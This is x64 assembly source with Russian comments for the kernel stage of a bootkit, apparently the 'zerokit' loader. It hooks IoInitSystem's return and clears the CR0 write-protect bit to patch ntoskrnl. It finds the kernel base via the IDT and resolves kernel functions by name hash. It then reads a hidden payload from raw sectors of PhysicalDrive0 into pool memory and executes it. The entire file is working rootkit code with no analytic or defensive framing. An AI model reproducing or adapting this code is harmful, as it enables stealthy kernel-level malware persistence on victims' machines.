use64

sub    rsp, 0x78 ; Выделяем место в стеке для RCX-home (16 байт) и место для адресов возврата в IoInitSystem и в наш хук.

push   rsi
; Сбрасываем бит протекции записи (16 бит).
mov    rax, cr0
push   rax ; +8 в стек
and    eax, 0xFFFEFFFF
mov    cr0, rax

call   Get_Current_EIP_0
Get_Current_EIP_0:
pop    rsi
add    rsi, orig_addr_value - Get_Current_EIP_0 ; esi = абсолютный адрес temp_data_x32.

mov    rax, [rsi] ; eax = аюсолютный адрес IoInitSystem.
mov    [rsp + 16], rax ; Ложим адрес возврата в IoInitSystem.

; Восстанавливаем оригининальный адрес, которые мы заменили на свой.
mov    rdx, [rsp + 136] ; edi = адрес вовзрата из нашего хука в ntoskrnl.
sub    rax, rdx ; Вычисляем дистанцию относительный адреса возврада до IoInitSystem.
mov    [rdx - 4], eax

; Устанавливаем адрес возврата из IoInitSystem в нашу хук-функцию, где будет происходить запуск зерокита.
lea    rax, [rsi + execute_payload_x64 - orig_addr_value] ; eax = абсолютный адрес execute_payload_x64
mov    [rsp + 24], rax




; Восстанавливаем WP-бит.
pop    rax
mov    cr0, rax

pop    rsi

ret ; Передаём управление на IoInitSystem.


; Здесь мы получаем управление после завершения работы функции IoInitSystem.
execute_payload_x64:
push   rax
push   rbx
push   rsi
push   rdi
push   rbp
pushfq
cld

sub    rsp, 50 ; Выделяем место в стеке для IDT и адресов необходимых функций.

; store IDTR on stack
sidt   [rsp] ; Сохраняем IDT регистр в стек (6 байт)
pop    bx ; 16 bit IDT limit
pop    rbx ; 64 bit IDT address
mov    rbp, rsp
add    rbp, 8 ; (ebp - 40) = Место для hFile, который проинициализирует функция ZwCreateFile.

;typedef struct _IDT_ENTRY
;{
;	uint16_t offset00_15;
;	uint16_t selector;
;	uint8_t ist:3;		// Interrupt Stack Table
;	uint8_t zeroes:5;
;	uint8_t gateType:4;
;	uint8_t zero:1;
;	uint8_t dpl:2;
;	uint8_t p:1;
;	uint16_t offset16_31;
;	uint32_t offset32_63;
;	uint32_t unused;
;} IDT_ENTRY, *PIDT_ENTRY;
mov    rax, [rbx + 4] ; Offset 16..63  [Interrupt Gate Descriptor]
mov    ax, [rbx] ; Offset 0..15   [Interrupt Gate Descriptor]
and    ax, 0xF000 ; Выравниваем адрес по границе страницы.
mov    rbx, rax
sub    rax, rax

; Начиная с обработчика прерывания методом спуска ищем базу ядра (ntoskrnl.exe).
find_pe_image_base_loop:
sub    rbx, 4096 ; Спускаемся на страницу ниже.
cmp    word [rbx], 'MZ' ; Проверяем на наличие сигнатуры MZ.
jnz    find_pe_image_base_loop
mov    eax, [rbx + 0x3c] ; Получаем смещение относительно начала образа до PE заголовка.
cmp    dword [rbx + rax], 'PE' ; Проверяем наличие сигнатуры PE заголовка.
jnz    find_pe_image_base_loop
cmp    word [rbx + rax + 0x18], 0x020B ; Проверяем Magic
jnz    find_pe_image_base_loop

call   data_addr_call

; Хеш-суммы функций, которые нам нужны для запуска зерокита (в алфавитном порядке - специфика алгоритма).
ExAllocatePoolWithTag dd 0x756CEEDA ; rbp-32
ZwClose               dd 0x9292AAB1 ; rbp-24
ZwCreateFile          dd 0xB8D72BA8 ; rbp-16
ZwReadFile            dd 0x9652DDAC ; rbp-8
                      dd 000000000h ; hash zero terminator (no more hash following)

data_addr_call:
lea    rdx, [rbx + rax] ; edx = адрес PE заголовка.
;mov    ecx, [rdx + 0x50] ; ecx = размер образа (SizeOfImage).
;mov    rdi, rbx ; edi = база образа.

; Используя таблицу экспорта, находим адреса нужных функций по их хешам.
mov    eax, [rdx + 0x88] ; [edx + OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress].
lea    rdx, [rax + rbx] ; rdx = абсолютный адрес до секции экспорта.
xor    rcx, rcx
xor    eax, eax

;typedef struct _IMAGE_EXPORT_DIRECTORY {
;	uint32_t   Characteristics;
;	uint32_t   TimeDateStamp;
;	uint16_t    MajorVersion;
;	uint16_t    MinorVersion;
;	uint32_t   Name;
;	uint32_t   Base;
;	uint32_t   NumberOfFunctions;
;	uint32_t   NumberOfNames;
;	uint32_t   AddressOfFunctions;     // RVA from base of image
;	uint32_t   AddressOfNames;         // RVA from base of image
;	uint32_t   AddressOfNameOrdinals;  // RVA from base of image
;} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
next_export_loop:
;  ecx      export counter
;  ebx      still base of ntoskrnl image (points to DOS Header)
;  esi      Export Name
;  edi      Hash Value
;  [esp]    Pointer to Next Hash
;  ebp      Pointer to Stack Variables
inc    ecx
xor    rsi, rsi
mov    esi, [rdx + 0x20] ; [rdx + AddressOfNames].
add    rsi, rbx ; абсолютный адрес до AddressOfNames.
mov    eax, [rsi + 4 * rcx]
lea    rsi, [rbx + rax] ; rsi = адрес, где лежит имя очередной экспортируемой функции.

sub    rax, rax
xor    edi, edi

; Вычисляем хеш-значение для имени функции.
calc_name_hash_loop:
lodsb
or     al, al
jz     Hash_Generated
ror    edi, 11
add    edi, eax
jmp    calc_name_hash_loop

Hash_Generated:
mov    rsi, [rsp] ; rsi = абсолютный адрес таблицы с хешами функций.
lodsd ; Считываем очередное хеш-значение.
or     eax, eax ; Конец?
jz     all_hashes_resolved ; Завершаем поиск адресов функций.
cmp    edi, eax ; Совдапают хеши?
jnz    next_export_loop ; Если не совпадают, переходим к следующей функции.
mov    [rsp], rsi ; Обновляем указатель на таблицу хешей.
mov    eax, [rdx + 0x24] ; [edx + AddressOfNameOrdinals].
lea    rdi, [rbx + rax] ; абсолютный адрес.
movzx  eax, word [rdi + 2 * rcx] ; index внутри таблицы ординалов.
push   rax
mov    eax, [rdx + 0x1C] ; [edx + AddressOfFunctions].
lea    rdi, [rbx + rax] ; абсолютный адрес.
pop    rax
mov    eax, [rdi + 4 * rax] ; lookup the address
add    rax, rbx ; eax = адрес экспортируемой функции.
xchg   rdi, rbp ; edi = адрес, куда будет сохранён адрес функции.
stosq ; сохраняем адрес.
xchg   rdi, rbp ; ebp = адрес, где будет сохранён адрес следующей экспортируемой функции.
jmp    next_export_loop

all_hashes_resolved:
mov    rsi, [rsp] ; esi = абсолютный адрес data_addr_call - 4.
add    rsi, payload_data - data_addr_call + 4
mov    [rsp], rsi

; set up data buffers (IoStatusBlock, FileHandle)
xor    rax, rax
push   rax ; IoStatusBlock
push   rax ; IoStatusBlock
mov    r9, rsp ; r9 points to 2 dwords data buffer (zeroed out)

mov    rbx, rsi ; ebx = указатель на местоположение данные о зероките.

; set up correct ObjectName (UNICODE_STRING structure)
add    rsi, disk_name_data - payload_data ; esi = абсолютный адрес к имени файлу.
push   rsi ; &length
add    qword [rsp], 4 ; +4 = address of unicode string
push   qword [rsi]
mov    rsi, rsp

; Инициализируем структуру OBJECT_ATTRIBUTES в стеке.
;typedef struct _OBJECT_ATTRIBUTES {
;    ULONG Length;
;    HANDLE RootDirectory;
;    PUNICODE_STRING ObjectName;
;    ULONG Attributes;
;    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
;    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
;} OBJECT_ATTRIBUTES;
push   rax ; SecurityQualityOfService  = NULL
push   rax ; SecurityDescriptor        = NULL
push   0x00000240 ; Attributes    = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE
push   rsi ; ObjectName                = "\??\PhysicalDrive0"
push   rax ; RootDirectory             = NULL
push   48 ; Length               = sizeof(OBJECT_ATTRIBUTES)
mov    r8, rsp

sub    rsp, 8 * 12; Выделям место в стеке для параметров функций и прочих данных.

; ZwCreateFile(&FileHandle, GENERIC_READ | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL)
; Обнуляем память
mov    rdi, rsp
mov    rcx, 2 * 12
rep    stosd
mov    [rsp + 64], byte 0x00000020
mov    [rsp + 56], byte 0x00000001
mov    [rsp + 48], byte 0x00000003

mov    edx, 0x80100000
lea    rcx, [rbp - 40]
call   qword [rbp - 16]
or     eax, eax ; eax == STATUS_SUCCESS?
jnz    execute_payload_x64_exit

; Прототип функции:
; PVOID ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
; ExAllocatePoolWithTag(NonPagedPool, zerokitSize, 0x74696E49);
xor    rdx, rdx
xor    rcx, rcx ; NonPagedPool
mov    r8d, 0x74696E49 ; Tag
mov    edx, [rbx + 8] ; zerokitSize
call   qword [rbp - 32]
or     rax, rax ; Получилось выделить?
jz     execute_payload_x64_exit_close_and_exit
mov    rsi, rax ; rsi = адрес, куда будет загружен зерокит.

; Прототип функции:
; NTSTATUS ZwReadFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
; ZwReadFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, Buffer, zerokitSize, offset, 0);
xor    eax, eax
mov    rdi, rsp
mov    rcx, 2 * 9
rep    stosd
mov    [rsp + 40], rsi ; Buffer
mov    [rsp + 56], rbx ; ByteOffset
mov    eax, dword [rbx + 8] 
mov    [rsp + 48], eax ; Length = zerokitSize.
mov    [rsp + 32], r9
xor    r9, r9
xor    r8, r8
xor    rdx, rdx
mov    rcx, [rbp - 40]
call   qword [rbp - 8]
or     eax, eax
jnz    execute_payload_x64_exit_close_and_exit

; Передаём управление зерокиту.
;typedef struct _mod_header
;{
;	uint32_t fakeBase;      // Фейковая база для вычисления реальных смещений.
;	uint64_t crc;           // 64-битная контрольная сумма вычисленная по телу mod-а.
;	uint32_t sizeOfMod;     // Размер тела, которое начинается сразу после данного заголовка.
;	uint32_t entryPointRVA; // RVA точки входа относительно заголовка.
;	uint32_t reserved1;     // 
;	uint32_t reserved2;
;	uint32_t reserved3;
;} mod_header_t, *pmod_header_t;
mov    r8d, [rsi + 16]
lea    rax, [rsi + r8]
mov    rcx, rsi
call   rax ; Вызываем точку входа mod_common.

execute_payload_x64_exit_close_and_exit:
; Прототип функции:
; NTSTATUS ZwClose(HANDLE Handle);
; ZwClose(FileHandle);
mov    rcx, [rbp - 40]
call   qword [rbp - 24]

execute_payload_x64_exit:
mov    rsp, rbp
popfq
pop    rbp
pop    rdi
pop    rsi
pop    rbx
pop    rax
add    rsp, 0x68 ; Извлекаем из стека параметр, который мы дублировали для IoInitSystem.
ret


payload_data:
LoaderOffsetLo dd 0
LoaderOffsetHi dd 0
LoaderSize dd 0 

orig_addr_value:
nop
nop
nop
nop
nop
nop
nop
nop

disk_name_data: